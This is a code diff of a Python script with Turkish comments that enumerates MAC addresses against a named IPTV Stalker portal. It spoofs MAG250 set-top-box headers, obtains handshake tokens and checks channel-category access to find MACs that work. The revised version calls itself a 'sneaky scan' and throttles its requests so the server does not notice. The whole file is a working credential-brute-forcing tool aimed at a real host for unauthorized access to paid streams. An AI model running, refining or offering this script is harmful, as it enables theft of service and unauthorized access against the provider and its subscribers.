@@ -1,64 +1,41 @@
 import requests
-import concurrent.futures
-import json
+import time
 
-# Portal API adresi
-api_url = "http://dm.lion-ott.com/portal.php"
+portal_url = "http://dm.lion-ott.com/portal.php"
 
-def derin_kontrol(mac):
-    # Gerçek bir MAG cihazı gibi davranan başlıklar
+def sinsi_kontrol(mac):
     headers = {
         'User-Agent': 'MAG250',
         'X-User-Agent': 'Model: MAG250; SW: 2.14.03-r6',
-        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;',
-        'Referer': 'http://dm.lion-ott.com/c/',
-        'Connection': 'Keep-Alive'
+        'Cookie': f'mac={mac}; stb_lang=en; timezone=Europe/Istanbul;'
     }
-
     try:
-        # Adım 1: Handshake yaparak geçici Token almayı dene
-        handshake_url = f"{api_url}?type=stb&action=handshake&token="
-        response = requests.get(handshake_url, headers=headers, timeout=10)
+        # 1. Adım: Handshake
+        res = requests.get(f"{portal_url}?type=stb&action=handshake&token=", headers=headers, timeout=10)
+        token = res.json().get('js', {}).get('token')
         
-        if response.status_code == 200:
-            data = response.json()
-            token = data.get('js', {}).get('token', '')
+        if token:
+            # 2. Adım: KRİTİK TEST - Kanal kategorilerini iste (Gerçeklik testi)
+            test_url = f"{portal_url}?type=itv&action=get_categories&token={token}"
+            test_res = requests.get(test_url, headers=headers, timeout=10)
             
-            if token:
-                # Adım 2: Token ile profil bilgilerini (tarih vb.) çekmeyi dene
-                profile_url = f"{api_url}?type=stb&action=get_profile&token={token}"
-                profile_res = requests.get(profile_url, headers=headers, timeout=10)
-                
-                if profile_res.status_code == 200:
-                    profile_data = profile_res.json()
-                    # Eğer profil verisi geliyorsa, bu MAC %100 GERÇEKTİR
-                    print(f"🔥 GERÇEK MAC BULDUM: {mac}")
-                    return f"{mac} | DURUM: AKTIF | TOKEN: {token}"
+            # Eğer sunucu gerçekten kategori listesi gönderiyorsa bu MAC GERÇEKTİR
+            if "title" in test_res.text.lower():
+                print(f"🎯 GERÇEK BULUNDU: {mac}")
+                return f"{mac} | DOĞRULANMIŞ YAYIN"
     except:
         pass
     return None
 
 def baslat():
-    # Çalışan bloğun (00:1A:79:7C:6B) üzerinden 256 ihtimal
-    base = "00:1A:79:7C:6B"
-    mac_listesi = [f"{base}:{hex(i)[2:].zfill(2).upper()}" for i in range(256)]
+    # YENİ BLOK DENEMESİ (Bu bloğu değiştirebilirsin)
+    base = "00:1A:79:32:A4" 
+    print(f"🕵️ Sinsi tarama yeni blokta ({base}) başladı...")
     
-    print(f"🚀 {len(mac_listesi)} adres için derin doğrulama başladı...")
-    
-    gercek_calisanlar = []
-    # Sunucuyu yormadan 10 thread ile yavaş ve temiz tara
-    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-        sonuclar = list(executor.map(derin_kontrol, mac_listesi))
-        gercek_calisanlar = [s for s in sonuclar if s]
-
     with open("calisan_maclar.txt", "w") as f:
-        if gercek_calisanlar:
-            for m in gercek_calisanlar:
-                f.write(f"http://dm.lion-ott.com/c/ | {m}\n")
-            print(f"✅ {len(gercek_calisanlar)} adet GERÇEK çalışan bulundu.")
-        else:
-            f.write("Maalesef bu blokta doğrulanmış (Token alan) MAC bulunamadı.")
-            print("😔 Doğrulanmış MAC bulunamadı.")
-
-if __name__ == "__main__":
-    baslat()
+        for i in range(100): # Az ve öz deneme
+            mac = f"{base}:{hex(i)[2:].zfill(2).upper()}"
+            sonuc = sinsi_kontrol(mac)
+            if sonuc:
+                f.write(f"{sonuc}\n")
+            time.sleep(1) # Sunucuyu uyandırmamak için 1 saniye bekle
